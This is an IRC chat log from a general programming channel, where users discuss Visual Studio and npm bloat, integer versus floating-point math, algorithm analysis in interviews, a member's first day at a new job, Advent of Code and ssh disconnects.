[16:23:46] <mrig> enevitable that the world will turn into a kindergarden.
[16:23:52] *** Joins: ravan (~ravan@user/ravan)
[16:23:55] <davve> its just a way of the OS purveyor to avoid legal issue
[16:24:16] <davve> lets be thankful while we can still run non/signed executables
[16:24:18] <Decker> that's not even the OS it's just an editor (vs code)
[16:24:24] <nomagno> You know, a lot of software works properly and is still malicious in minor ways that pile up
[16:24:27] <DnzInFirefox> Does anyone know a good point-cloud mesh reconstruction tool able to use some type of helper geometry for missing data
[16:24:42] <DnzInFirefox> I have a room with missing data, and I'd like to just assume that the floor is a flat plane for example
[16:25:13] <mrig> lol! I have just spotted that there is an indication of the size required :D
[16:25:26] <mrig> when you select the package, this is insaine!
[16:26:29] <mrig> ah cool and a tree where you can reduce the components. 
[16:26:36] <DnzInFirefox> yeah I don't use vscode for that reason
[16:26:37] <DnzInFirefox> it's npm
[16:26:43] <rtypo> flipchan: https://i.imgur.com/1QebJ1z.png
[16:26:43] <bayaz> Type: image/png Size: 67.9 kB 
[16:26:45] <DnzInFirefox> which means it's 100% more bloated than it needs to be
[16:26:54] <rtypo> flipchan: (is this how it's supposed to work?)
[16:26:58] <Decker> mrig by 100's of k at a time :)
[16:26:59] <mrig> this is visual studio not vscode, I imagine that it is similar though
[16:27:05] <Decker> (a few drops in the bucket)
[16:27:06] <mrig> gigabytes
[16:27:13] <DnzInFirefox> at least visual studio is from one source
[16:27:20] <mrig> the packages take gigabytes!
[16:27:22] <DnzInFirefox> instead of vscode being from a billion different repos
[16:28:01] <DnzInFirefox> I will never stop whining about npm
[16:28:02] <mrig> desktop dev is 10 GB and I only want the compiler and a few windows API calls.
[16:28:11] <mrig> two or three max
[16:28:22] <DnzInFirefox> download the c++ compiler only
[16:28:29] <mrig> Yes npm is scary all the stuf tthat it comes with.
[16:28:40] <mrig> I avoid it myself.
[16:28:55] <DnzInFirefox> I only install it on virtual computers
[16:29:02] <DnzInFirefox> and consider them insecure
[16:29:16] <DnzInFirefox> ie, I don't put any important passwords into it
[16:29:39] *** Joins: mishugana (~mishugana@user/mishugana)
[16:30:42] <DnzInFirefox> is there really not a good alternative to meshlab
[16:30:51] <DnzInFirefox> is there no other tool which is good for mesh reconstruction
[16:30:56] <DnzInFirefox> from point cloud data
[16:31:52] <mrig> well I've managed to get it down to 6GigaBytes, will try this and see if it works for my needs.
[16:32:18] *** Quits: GreenAlpaca (~GreenAlpa@user/greenalpaca) (Quit: WeeChat 3.4)
[16:32:50] *** Joins: GreenAlpaca (~GreenAlpa@user/greenalpaca)
[16:33:05] *** aqua is now known as kish^
[16:33:07] *** kish^ is now known as kish`
[16:35:04] *** Joins: trace987 (~trace@ip5b42963a.dynamic.kabel-deutschland.de)
[16:35:10] <mrig> DnzInFirefox my reasoning for not using npm is that JS does not have ints, any language that is using only decimals is broken from the outset :D
[16:35:57] *** Quits: jjido (~Denis@2a02:c7f:5c91:e700:cd30:5759:3f90:149b) (Quit: My MacBook Air has gone to sleep. ZZZzzz…)
[16:36:00] <mrig> I did go and get a barge pole and proded it a little, but in the end decided that it was probably better to focus on learening to use int and floats well.
[16:36:07] *** Joins: exvicesindaco_ (~exvicio@host-87-14-199-43.retail.telecomitalia.it)
[16:36:11] *** Quits: trace987 (~trace@ip5b42963a.dynamic.kabel-deutschland.de) (Remote host closed the connection)
[16:36:17] *** Quits: user2001 (~trace@ip5b42963a.dynamic.kabel-deutschland.de) (Ping timeout: 256 seconds)
[16:36:18] *** Quits: DnzInFirefox (~DnzInFire@mobile-access-6df083-245.dhcp.inet.fi) (Ping timeout: 256 seconds)
[16:37:20] *** Quits: mishugana (~mishugana@user/mishugana) (Quit: leaving)
[16:37:25] *** Quits: exvicesindaco (~exvicio@user/exvicesindaco) (Ping timeout: 256 seconds)
[16:37:33] *** exvicesindaco_ is now known as exvicesindaco
[16:41:00] *** Joins: Daemonick (~Daemonick@77.49.175.20.dsl.dyn.forthnet.gr)
[16:41:52] <mrig> seems to me that the use of int's and floats is absolutly fundamental to CS and absolutly should not be abstracted away.
[16:42:08] *** Joins: digilink (~digilink@user/digilink)
[16:42:10] <mrig> I suppose this really is user preference though, but I do like reality to be real :)
[16:42:57] *** Joins: mishugana (~mishugana@user/mishugana)
[16:42:58] *** Quits: shokohsc (~shokohsc@lfbn-idf2-1-630-171.w86-246.abo.wanadoo.fr) (Quit: The Lounge - https://thelounge.chat)
[16:43:06] *** Joins: trace987 (~trace@ip5b42963a.dynamic.kabel-deutschland.de)
[16:46:36] *** Joins: maxzor_ (~maxzor@lfbn-idf2-1-402-19.w86-246.abo.wanadoo.fr)
[16:47:10] *** Quits: ProfSimm (~ProfSimm@87.227.196.109) (Remote host closed the connection)
[16:48:37] *** Quits: maxzor__ (~maxzor@2a01cb04054faa00745d5fe5c290fd5e.ipv6.abo.wanadoo.fr) (Ping timeout: 240 seconds)
[16:52:31] *** Joins: P4nuS2k (~P4nuS2k@dynamic-219-5.keskikaista.fi)
[16:53:34] <Thedarkb1-Work> I find I very rarely use floats, and when I do, it's because I have to.
[16:54:30] <Thedarkb1-Work> Fixed point math suffices most of the time in my experience.
[16:54:31] *** Joins: Filohuhum (~dante@gateway/tor-sasl/filohuhum)
[16:54:37] *** Quits: trace987 (~trace@ip5b42963a.dynamic.kabel-deutschland.de) (Ping timeout: 240 seconds)
[16:54:37] *** Quits: panusiik (~P4nuS2k@109.204.202.167) (Ping timeout: 240 seconds)
[16:54:46] <Decker> ya - but do you really care if the operation was done with a float or an int if the answer is the same?
[16:54:51] <Thedarkb1-Work> Not really.
[16:55:03] <Decker> the only operator that seems to care is /
[16:56:28] <nomagno> Well yeah that's because integer division is useful because it does integer division, which by convention has a remainder when it isn't exact
[16:57:23] *** Joins: Camilo (~hugh@host-92-1-126-125.as13285.net)
[16:58:18] *** Joins: CatCow (~wtf_over@c-73-96-109-206.hsd1.or.comcast.net)
[16:59:42] <Decker> shift and subtract :)
[16:59:56] <mrig> Thedarkb1-Work I'm learning about them at the moment, it is true that they are for specific use cases, this one being graphical applications. But I think that the nuance is still relevent to math quite profoundly.
[17:00:18] <Thedarkb1-Work> The PS1 did all of its graphics with integer math.
[17:00:26] <Thedarkb1-Work> Granted, it did suffer slightly for it.
[17:00:45] *** Quits: blackcatmaxy (~blackcatm@2001:470:69fc:105::bae5) (Quit: Client limit exceeded: 20000)
[17:01:00] <mrig> you can do both for sure, my thought is that the subject of why it is that they both exist is sort of fundamental.
[17:01:04] *** Joins: lavos (~molt@178-222-245-206.static.isp.telekom.rs)
[17:01:14] *** Joins: blackcatmaxy (~blackcatm@2001:470:69fc:105::bae5)
[17:01:23] <mrig> using a slide rule likely brings about the same understanding.
[17:01:37] *** Quits: P4nuS2k (~P4nuS2k@dynamic-219-5.keskikaista.fi) (Ping timeout: 240 seconds)
[17:01:47] *** Quits: GreenAlpaca (~GreenAlpa@user/greenalpaca) (Quit: WeeChat 3.4)
[17:01:58] <nomagno> Well I am not using floats in my game, but given it's 2D it's not necessarily the biggest issue ever
[17:02:35] <mrig> sure no, not at all and both can server the same purpose for sure.
[17:03:30] <mrig> One of the criticims that casey makes of many indi games is the 'stutter' or jitter than you get when things move, because subpixel rendering has not been used. But this can be done with ints too.
[17:04:24] <mrig> floats are just really fast on many cpu's I supose, I would imagine that this is the real deal breaker.
[17:04:28] <nomagno> I have bigger performance issues, namely the fact I'm doing software rendering, in portable C99
[17:04:47] <mrig> sounds as thought you are having fun then.
[17:04:57] <mrig> though rather
[17:04:59] <nomagno> Indeed :D
[17:05:11] *** Quits: molt (~molt@178-222-245-206.static.isp.telekom.rs) (Ping timeout: 256 seconds)
[17:06:08] *** Joins: GreenAlpaca (~GreenAlpa@user/greenalpaca)
[17:10:03] *** Quits: k3nn7 (~k3nn7@2a02:a31b:43e:aa80:1775:e3c1:d941:4f84) (Remote host closed the connection)
[17:14:00] *** Quits: w1kl4s (~w1kl4s@user/w1kl4s) (Quit: Bye)
[17:14:07] <adder`> how often do regular (non-scientific) programmers need to analyze algorithms and prove recurrences?
[17:14:35] *** Joins: w1kl4s (~w1kl4s@user/w1kl4s)
[17:15:05] *** Quits: w1kl4s (~w1kl4s@user/w1kl4s) (Client Quit)
[17:15:15] <adder`> and same q for game engine and animation programmers
[17:15:37] *** Joins: w1kl4s (~w1kl4s@user/w1kl4s)
[17:16:11] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[17:18:19] *** Quits: jyom10j3 (~jyom10j3@2405:6580:8da0:3800:3e84::1000) (Quit: Client closed)
[17:20:38] <bjs> adder`: i'd bet somewhere between "almost never" and "never"
[17:21:39] *** Joins: pulse (~pulse@user/pulse)
[17:21:48] *** Quits: jaysicks (~jaysicks@178-164-152-202.pool.digikabel.hu) (Quit: Leaving)
[17:22:34] <bjs> but it's not that hard to make a decent "guess" at the time and space complexity of their programs,  without having to do the actual mathematics to prove anything
[17:23:01] <adder`> bjs, sounds good. not sure what the companies that put an emphasis on "algorithms and data structures" want then?
[17:23:34] *** Joins: soapsudsxx (~soapsudsx@209.221.40.151)
[17:23:39] <user51> today is a good day.
[17:24:08] *** Quits: rickybob (~rickybob@gateway/vpn/pia/rickybob) (Quit: rickybob)
[17:24:19] <bjs> adder`: you mean during an interview?
[17:24:26] <user51> i built the prefix tree  failed to do yesterday
[17:24:35] <adder`> bjs, yeah, and I suspect once you land a job
[17:24:55] *** Quits: mishugana (~mishugana@user/mishugana) (Quit: leaving)
[17:25:35] <bjs> adder`: well some people like to "test" the candidates in an interview, and algorithms & data structures is a huge area with lots of problems you can throw at people to see how they handle it.  Quite often people are just "lazy" when they do this though
[17:25:50] *** Joins: rickybob (~rickybob@gateway/vpn/pia/rickybob)
[17:26:33] <bjs> I mean there's clearly lots of good skills it can test and the ways these algorithms and data structures work can be applied elsewhere,  but very rarely will you do the actual analysis of the algorithm like say, an algorithms text book would
[17:26:58] <adder`> I'm reading this book which is deeply interwoven with mathematical rigor and I want to barf
[17:27:04] <bjs> I bet if you ask the average programmer how often they use the master theorem their response would be "what's the master theorem?";  people just don't do it very often.
[17:27:24] <bjs> adder`: which book?  but also, why are you reading one full of mathematical rigor if you don't like the mathematics
[17:27:38] <adder`> bjs, CLRS
[17:27:51] <adder`> bjs, it's the go-to book for algorithms
[17:27:53] <bjs> adder`: that is a very classic book,  but yes it's very dense in the mathematics
[17:27:55] <bjs> i know
[17:29:52] <bjs> adder`: in the "real world" nobody does the analysis in the depth that CLRS does;  you can often get a good "guess" at the bounds though
[17:30:29] <adder`> bjs, that's encouraging
[17:31:41] *** Quits: reynir (root@user/reynir) (Quit: WeeChat 2.3)
[17:33:04] <mrig> I think that it is just intuative to some.
[17:33:39] <Trashlord> unit testing for private methods: would you say that copying the private method into some public class that's used only for testing code, doing all the debugging and testing and stuff there with that method set to public, then copying it back into its "real" location and setting it to private is good?
[17:33:39] *** Quits: exvicesindaco (~exvicio@host-87-14-199-43.retail.telecomitalia.it) (Ping timeout: 256 seconds)
[17:33:47] <mrig> Those are the ones who should be employed, but for some reason we seem to favor those who love complexity, a curious situation really.
[17:34:10] <Trashlord> basically having two copies of the same code, one for testing, one for actual production usage
[17:34:15] * mrig gave up looking for logic in english a long time ago ;)
[17:34:18] <Trashlord> I think it's not a good approach
[17:34:38] * mrig found the spelling way to complicated.
[17:35:10] <mrig> I'm nearly there, almost back in my haven of game programming lessons :)
[17:35:47] *** Quits: mrig (~mrig@user/mrig) (Quit: Going offline, see ya! (www.adiirc.com))
[17:37:23] *** Joins: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060)
[17:38:01] *** Joins: exvicesindaco (~exvicio@user/exvicesindaco)
[17:38:11] *** Quits: Iarfen (~quassel@181.43.57.45) (Ping timeout: 256 seconds)
[17:39:58] *** Quits: exvicesindaco (~exvicio@user/exvicesindaco) (Client Quit)
[17:40:18] *** Joins: jjido (~Denis@2a02:c7f:5c91:e700:cd30:5759:3f90:149b)
[17:41:39] *** Quits: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060) (Client Quit)
[17:43:18] <Stefan26> I wonder if, when you apply for a software job at google, they check your browsing history?
[17:46:09] *** Quits: BrianG61UK__ (~BrianG61U@2a02:8010:66b7:dddd:95d8:317a:8f88:31cf) (Quit: Leaving)
[17:46:18] *** Quits: BrianG61UK (~BrianG61U@2a02:8010:66b7:dddd:1457:faae:10f6:45e5) (Quit: Leaving)
[17:46:54] *** Joins: BrianG61UK (~BrianG61U@2a02:8010:66b7:dddd:1457:faae:10f6:45e5)
[17:47:27] *** Joins: BrianG61UK_ (~BrianG61U@2a02:8010:66b7:dddd:95d8:317a:8f88:31cf)
[17:47:54] *** Quits: xsperry (~xs@user/xsperry) (Remote host closed the connection)
[17:48:09] *** Joins: rustyshackleford (uid236774@id-236774.helmsley.irccloud.com)
[17:49:31] <user51> that's why they invented identity fraud :)
[17:49:43] <Stefan26> no Trashlord i wouldnt like seeing that either
[17:49:57] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 240 seconds)
[17:50:35] *** Quits: jjido (~Denis@2a02:c7f:5c91:e700:cd30:5759:3f90:149b) (Quit: My MacBook Air has gone to sleep. ZZZzzz…)
[17:50:44] *** Joins: dsrt^ (~dsrt@207.5.21.20)
[17:51:17] *** Quits: soapsudsxx (~soapsudsx@209.221.40.151) (Remote host closed the connection)
[17:52:40] *** Joins: flandish (~flandish@user/flandish)
[17:52:53] <flandish> mornin'
[17:52:54] *** Joins: pretty_dumm_guy (trottel@gateway/vpn/protonvpn/prettydummguy/x-88029655)
[17:53:28] <InPhase> Stefan26: Well we know that google has automated systems monitoring for search terms in order to offer people challenges that can lead to job offers.  But a full perusal of the search history of applicants might be illegal in many jurisdictions depending on what they would look for, as that could easily open them up to hiring discrimination lawsuits.  I imagine their lawyers would urge substantial 
[17:53:34] <InPhase> caution on that.
[17:54:05] *** Joins: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060)
[17:54:40] *** Quits: flandish (~flandish@user/flandish) (Client Quit)
[17:56:13] *** Quits: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060) (Client Quit)
[17:56:31] *** Joins: exvicesindaco (~exvicio@user/exvicesindaco)
[17:56:39] *** Quits: CatCow (~wtf_over@c-73-96-109-206.hsd1.or.comcast.net) (Quit: Textual IRC Client: www.textualapp.com)
[17:56:57] *** Quits: davidk156305 (~davidk156@2001:470:69fc:105::1:484e) (Quit: Client limit exceeded: 20000)
[17:57:30] *** Joins: premultiplied (~premultip@69-84-3-189.mxu.aerioconnect.net)
[17:57:44] <InPhase> Stefan26: Imagine something as simple as google search terms contain hints about what religion someone is, because people look things up relating to their religion.  Then suddenly if Google has a slight statistical bias in their hiring that correlates with the religion of applicants, while having observed this in the search data they looked at, they could be subject to a massive lawsuit.
[17:57:45] *** Joins: davidk156305 (~davidk156@2001:470:69fc:105::1:484e)
[17:58:53] *** Joins: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060)
[18:00:09] *** Quits: inlight (~inlight@user/inlight) (Ping timeout: 256 seconds)
[18:06:12] <edgar-rft> I think they're only afraid that Thor will throw lightning flashes at them.
[18:08:47] *** Quits: dfghfgdh (~sdfgsdfg@user/sdfgsdfg) (Ping timeout: 256 seconds)
[18:09:24] <wuldor> that's zeus bruv
[18:10:57] *** Quits: jazzy (~jaziz@user/jaziz) (Ping timeout: 240 seconds)
[18:11:11] *** Joins: exvicesindaco_ (~exvicio@host-87-14-199-43.retail.telecomitalia.it)
[18:12:23] *** Joins: Auron (~Auron956@user/auron)
[18:15:01] *** Quits: exvicesindaco (~exvicio@user/exvicesindaco) (Ping timeout: 256 seconds)
[18:15:08] *** exvicesindaco_ is now known as exvicesindaco
[18:15:38] *** Joins: mrig (~mrig@user/mrig)
[18:16:32] *** Quits: joe_colben (~joe____co@185.190.112.211) (Remote host closed the connection)
[18:16:59] <Stefan26> right that makes sense InPhase
[18:18:09] *** Quits: leduyquang753 (~leduyquan@user/leduyquang753) (Quit: Gotta go, see you guys later.)
[18:20:10] *** Quits: herjazz (~herjazz@p6758124-ipngn30801marunouchi.tokyo.ocn.ne.jp) (Quit: leaving)
[18:20:15] *** Joins: rsx (~dummy@ppp-188-174-153-38.dynamic.mnet-online.de)
[18:20:34] *** Quits: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[18:21:35] *** Quits: amigojapan (uid86330@id-86330.helmsley.irccloud.com) ()
[18:26:17] *** Quits: exvicesindaco (~exvicio@host-87-14-199-43.retail.telecomitalia.it) (Ping timeout: 240 seconds)
[18:26:19] *** Joins: exvicesindaco_ (~exvicio@host-82-50-190-112.retail.telecomitalia.it)
[18:26:19] *** exvicesindaco_ is now known as exvicesindaco
[18:27:04] *** Quits: job (~job@wikimedia-commons/pandakekok9) (Remote host closed the connection)
[18:27:37] *** Quits: Inline (~Inline@aftr-37-201-240-204.unity-media.net) (Quit: Leaving)
[18:29:37] *** Quits: Brett[Air] (~Brett@124.148.79.4) (Ping timeout: 240 seconds)
[18:32:35] *** Joins: wovixo (~wovixo@128.104.205.49)
[18:34:25] <mrig> Yikes visual studio has gone 64 bit and they have change where everything is kept :|
[18:35:24] *** Joins: Amadiro (~Amadiro@84.209.11.12)
[18:36:33] *** Quits: jamea (~jamea@177.239.81.39) (Ping timeout: 256 seconds)
[18:36:40] *** Joins: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060)
[18:39:24] *** Joins: Inline (~Inline@aftr-37-201-240-204.unity-media.net)
[18:40:44] <edgar-rft> wuldor: heresy, lighning flashes are caused by Thor's hammer when he fights the Ice giants.
[18:43:17] *** Quits: Camilo (~hugh@host-92-1-126-125.as13285.net) (Ping timeout: 240 seconds)
[18:43:51] *** Joins: Macuser (~Macuser@2600:1003:b447:e8e:ecb6:a4e5:40a1:d1ff)
[18:44:03] *** Joins: mattallmill (~mattallmi@ip68-103-130-85.ks.ok.cox.net)
[18:44:48] <Stefan26> what's 64 bit mean in this context mrig
[18:45:14] <mrig> Well there are two folders on windows, Programs and Programs (x86)
[18:45:36] <pyzozord> soo the new company is super cool
[18:45:38] <mrig> something to do with the introduction of itanium processors in the distant past.
[18:45:44] <pyzozord> and i got a super cool team
[18:45:51] <mrig> pyzozord nice!
[18:46:13] *** Joins: slakman (~slakman@112.202.217.22)
[18:46:23] <Stefan26> There aren't 32 bit in Mac?
[18:46:37] <pyzozord> we playd mario carts for like 30 minutes in the middle of the day
[18:46:53] *** Joins: inlight (~inlight@157.35.64.91)
[18:46:53] *** Quits: inlight (~inlight@157.35.64.91) (Changing host)
[18:46:53] *** Joins: inlight (~inlight@user/inlight)
[18:46:58] *** Joins: Guest98 (~Guest98@83.234.93.153)
[18:46:59] <mrig> Stefan26 the previous installs of VS had a batch file that you could call to load the compiler into the path of you terminal, the defalt was 32 bit, adding x64 as a flag got you a 64 bit complier, there were two.
[18:47:20] *** Quits: Guest98 (~Guest98@83.234.93.153) (Client Quit)
[18:47:21] <edgar-rft> 32 bit are not enough to pay a mac :-)
[18:47:23] <mrig> could be that they have switched to llvm could be that I've not got the one that I require installed, not sure as yet.
[18:48:31] <mrig> Stefan26 It is not the how many bits that is causing me the current issue, it is where is the darnded thing and how can I call it within my terminal :D
[18:48:46] <mrig> My program can compile and run with either.
[18:49:23] *** Quits: Amadiro (~Amadiro@84.209.11.12) (Remote host closed the connection)
[18:49:38] <mrig> I'm rolling back to 2019, seems like the sanest solution in this circumstance.
[18:49:49] *** Quits: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[18:52:33] *** Quits: mrig (~mrig@user/mrig) (Quit: Going offline, see ya! (www.adiirc.com))
[18:52:55] *** Joins: mrig (~mrig@user/mrig)
[18:53:53] <mrig> Really good news pyzozord, it sounds as though you have landed upon your feet :)
[18:55:53] <pyzozord> yes :)
[18:56:09] <pyzozord> i sensesed some territorial feelings from the senior in the team
[18:56:15] *** Joins: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060)
[18:56:28] <mrig> Does anyone know whether the compiler has changed in the latest VS? I'm wondering about rolling back or trying another of the humongous packages.
[18:56:31] <pyzozord> but he seems to have accepted me and even liked me at the end of the day
[18:56:32] <Stefan26> good it seems like a fun place pyzozord
[18:56:45] <pyzozord> which I'm glad, because I have no intentions of taking his place or anything
[18:56:49] <mrig> pyzozord that is great.
[18:57:11] <mrig> well secure adults dont get involved in pissing contests :)
[18:57:28] <pyzozord> but yeah very cool folks first day pretty much as good as it gets
[18:58:52] <pyzozord> I have a massive headache though
[18:59:21] <pyzozord> I went to sleep at 00:00, couldn't sleep half night, had to wake up at 6, and did not stand up from a computer until 18:00
[18:59:28] <pyzozord> had no food either
[19:00:13] <pyzozord> but partially because I just didn't assert a break, but I am sure this will solve itself with time
[19:00:41] <FloridaMan> you should always assert a break or you'll get a fallthrough
[19:01:11] *** Joins: xsperry (~xs@cpe-188-129-71-242.dynamic.amis.hr)
[19:01:15] *** Quits: xsperry (~xs@cpe-188-129-71-242.dynamic.amis.hr) (Changing host)
[19:01:15] *** Joins: xsperry (~xs@user/xsperry)
[19:01:50] *** Joins: Camilo (~hugh@94.229.64.112)
[19:02:19] <pyzozord> yep will be watching out for that, but you know you don't want to be too pushy on your first day, and I generally have problems with being pushy
[19:02:46] <mrig> Ah it looks like I can add the 2019 build tools, this might do it :)
[19:02:58] *** Joins: sub0 (~bc8147f2@cerf.good1.com)
[19:03:03] *** Quits: Camilo (~hugh@94.229.64.112) (Read error: Connection reset by peer)
[19:03:39] <mrig> pyzozord how are you working, is this at a distance?
[19:03:50] <mrig> or a goto job?
[19:04:51] <pyzozord> it's at hmm, 1/5th of world distance
[19:05:06] *** Quits: anovick (~anovick@2a0d:6fc0:1ce2:c500::34d) (Read error: Connection reset by peer)
[19:05:42] <mrig> oh right remote unless you have a very fast mario carte.
[19:05:52] *** Quits: Rayke (rayke@user/rayke) (Quit: WeeChat 3.4)
[19:06:37] *** Joins: anovick (~anovick@2a0d:6fc0:1ce2:c500::34d)
[19:07:17] <pyzozord> yep, need to wait and see but I want to say that's the best job I ever had
[19:08:00] <pyzozord> also maybe I learned more how to function in corporations better
[19:08:06] *** Joins: Camilo (~hugh@host-92-1-126-125.as13285.net)
[19:08:51] *** Quits: phogg (~phogg@user/phogg) (Ping timeout: 250 seconds)
[19:12:48] <mrig> Yay, I found the compiler script!
[19:13:07] <mrig> pyzozord are you becoming a company man?
[19:14:23] <pyzozord> as long as the relationshiph is mutually beneficial I don't see any issue
[19:14:40] *** Quits: trevors (~trevors@c-65-96-171-157.hsd1.ma.comcast.net) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[19:15:21] <pyzozord> but as you asked that something inside me protested a bit :P
[19:16:05] <mrig> aha, the rebel is still within you, you are not lost to the darkside just yet!
[19:16:15] <deniska> corpozord
[19:16:23] <pyzozord> lol
[19:16:25] <mrig> lol
[19:16:58] <pyzozord> thats the first impression, the first month is always a honeymoon, lets see what happens after
[19:16:59] <mrig> yay building again!
[19:17:18] <mrig> right need to rebot to reset a path (this is windows after all)
[19:17:18] <edgar-rft> let's bit-protest boolean stuff
[19:17:22] <Stefan26> deniska you gonna do anything fun from now to AoC2022?
[19:18:09] <mrig> Stefan26 are you experiencing advent withdrawal? :)
[19:18:15] *** Joins: magla (~gelignite@55d4d852.access.ecotel.net)
[19:18:33] <Stefan26> yeah 
[19:18:37] <pyzozord> right I need to get back to my aoc'21, not today though
[19:18:38] <Stefan26> i did foobar thing too
[19:18:53] <mrig> Oh, we need to dream up some tricky questions for you!
[19:18:56] <Stefan26> i need to do a hobby project
[19:19:05] <mrig> Hobby project would be cool.
[19:19:08] *** Joins: danielrparks (~quassel@2600:1700:3f7b:20f:9cc:dd59:e257:1efa)
[19:19:08] <Stefan26> I made https://stefanen.github.io/ some year ago
[19:19:09] <bayaz> Title: M_M_k simulation2 
[19:19:13] *** Joins: jamea (~jamea@201.77.110.253)
[19:19:21] <mrig> or an open source project that is running
[19:19:25] <Stefan26> but i wanna do some sophisticated random graph/network (e.g. traffic) simulation
[19:19:48] <Stefan26> im not that good at understanding other people's code :D
[19:19:55] <Stefan26> but open source is great path too
[19:20:02] <deniska> Stefan26: I still have 2.5 puzzles in this year, and some more in some of the previous
[19:20:09] <mrig> brb
[19:20:12] *** Quits: mrig (~mrig@user/mrig) (Quit: Going offline, see ya! (www.adiirc.com))
[19:21:45] <Stefan26> I *could* do the previous 5 years, that's like 300 problems
[19:22:04] <Stefan26> but it sort of feels like watching a football world cup finals a few years after it happend
[19:22:49] *** Quits: rickybob (~rickybob@gateway/vpn/pia/rickybob) (Quit: rickybob)
[19:22:52] <pyzozord> except you kick the ball
[19:23:08] *** Joins: rickybob (~rickybob@gateway/vpn/pia/rickybob)
[19:23:11] *** Quits: rickybob (~rickybob@gateway/vpn/pia/rickybob) (Remote host closed the connection)
[19:23:29] <deniska> I also have a couple of freelance gigs, and, like, a job, so not much time for pet projects lately :)
[19:23:35] *** Quits: jinsun (~quassel@user/jinsun) (Read error: Connection reset by peer)
[19:24:16] <pyzozord> I just want to finish aoc from last year so that I have one full one finished. And it already forced me to learn few things, like matrices
[19:24:46] <pyzozord> after I finish aoc I do Basic Mathematics by Lang
[19:26:35] <pyzozord> hopefully I'll have enough energy to do it
[19:28:29] *** Quits: riscpunk (~compscipu@107-214-234-232.lightspeed.sndgca.sbcglobal.net) (Quit: WeeChat 2.8)
[19:28:39] <nomagno> Oh pyzozord, wasn't today your first day on your new job?
[19:28:42] *** Joins: newpy (~newpy@2601:280:4381:1390:3d0c:64dc:3003:dbe5)
[19:28:50] *** Joins: compscipunk (~compscipu@107-214-234-232.lightspeed.sndgca.sbcglobal.net)
[19:29:54] *** Joins: mrig (~mrig@user/mrig)
[19:29:58] *** Joins: Xaldafax (~xaldafax@cpe-198-72-160-101.socal.res.rr.com)
[19:30:16] *** Quits: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[19:30:33] * mrig sighs, logged out by my screen saver ...
[19:30:40] *** Joins: trevors (~trevors@c-65-96-171-157.hsd1.ma.comcast.net)
[19:31:46] <edgar-rft> your screen saver only wanted to save you from reading this shit :-)
[19:31:54] <mrig> lol
[19:32:53] <Decker> https://www.wolframcloud.com/obj/68428eed-0e9a-411b-a054-03d3c6aab0f7 
[19:34:26] *** Joins: Amadiro (~Amadiro@84.209.11.12)
[19:34:30] *** Joins: mishugana (~mishugana@user/mishugana)
[19:35:46] <mrig> Seems a little more advanced compared to my baby calculator : https://8i8.fr/calc/?expr=plot(sin(x*y%2F10)%2F10)
[19:35:47] <bayaz> Title: 8i8.fr 
[19:36:12] <mrig> :/ onwards and upwards
[19:37:21] <mrig> someone said the other day that go is no good for visual stuf, seems ok once you get the hang of it.
[19:37:31] <KillerWasp> It seems to me or ssh is too stupid and cuts off every so often? 'broken pipe'
[19:37:39] <pyzozord> nomagno: it was, I report good news. So far it was super cool
[19:37:46] *** Joins: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060)
[19:37:54] *** Joins: inky (~inky@5.63.161.26)
[19:38:07] <Decker> just you KillerWasp
[19:38:25] <KillerWasp> Does anyone else get ssh cut off all the time?
[19:38:38] <pyzozord> no
[19:38:46] <Decker> It doesn't even do like keep alive - if you're quiet, you can even disconnect the internet completely, and reconnect and it would never know
[19:39:14] <pyzozord> oh really? didn't know that
[19:39:26] <nomagno> mrig: that server side rendering is fabulous, JavaScript out the window for once!
[19:39:46] <pyzozord> Decker: I think i'd get "remote host closed connection"
[19:40:05] *** Joins: password2 (~password8@user/password2)
[19:40:08] <Decker> pyzozord only if you poked it while the connection was down
[19:40:10] <mrig> nomagno thank you, yes it takes a bit of getting used to but seems to be quite flexible too, using cookies there to keep a history too.
[19:40:29] <Decker> and then not for like a very long time - used to be like 10 seconds; but the disconnect timer is insane now
[19:40:51] <Decker> but that's probably just my version
[19:40:58] <Decker> Arch's version(?)
[19:41:09] *** Quits: inky_ (~inky@5.77.223.178) (Ping timeout: 256 seconds)
[19:42:09] *** Quits: ObscenityAlt (~Obscenity@user/obscenity) (Ping timeout: 256 seconds)
[19:43:46] <Decker> mrig ya - the x and y are function results too, not just the raw inputs... so just incrementing x and y and using those positions to plot isn't really enough
[19:44:19] <mrig> Sure no, just a toy this one, but the concepts are really what I'm investigating.
[19:44:50] <mrig> and no cache for this would be a killer to, just playing about right now.
[19:44:59] *** Quits: inky (~inky@5.63.161.26) (Ping timeout: 256 seconds)
[19:45:28] *** Joins: inky (inky@gateway/vpn/protonvpn/inky)
[19:48:04] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[19:48:21] *** Quits: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[19:50:05] *** Quits: pulse (~pulse@user/pulse) (Ping timeout: 256 seconds)
[19:50:48] <mrig> Been meaning to take inspiration from wolframs automata though, should be quite simple to add that.
[19:51:25] <mrig> once I've finished my graphics coding course, not even the sky will be the limit. :)
[19:52:30] <mrig> That code was mostly based upon code in 'The go programming language', great book.
[19:55:36] *** Quits: Leonardzzz (~Administr@114.55.127.80) (Remote host closed the connection)
[19:55:41] <mrig> Decker what was your calculation a map of?
[19:58:19] *** Joins: xa0s (~xa0s@mab.sdf.org)
[19:59:20] *** Joins: pulse (~pulse@user/pulse)
[19:59:28] <Decker> mrig light geodesics in curved space (sans time)
[19:59:44] <Decker> inserting a sphere of a certain size in random locations 
